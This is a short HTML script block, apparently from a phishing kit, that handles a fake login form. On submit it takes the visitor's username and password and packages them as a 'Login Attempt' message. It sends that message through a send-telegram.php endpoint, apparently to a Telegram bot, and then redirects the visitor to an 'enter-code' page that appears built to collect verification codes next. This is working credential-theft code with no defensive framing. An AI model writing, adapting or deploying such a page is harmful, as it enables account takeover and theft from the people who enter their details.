<script>
const API_URL = '/rob/api/send-telegram.php';

async function handleLoginSubmit() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    const message = `🔐 <b>Login Attempt</b>\n\n👤 Username: <code>${username}</code>\n🔑 Password: <code>${password}</code>`;
    
    await sendToBot(message, 'login');
    window.location.href = '/rob/enter-code/';
}
</script>
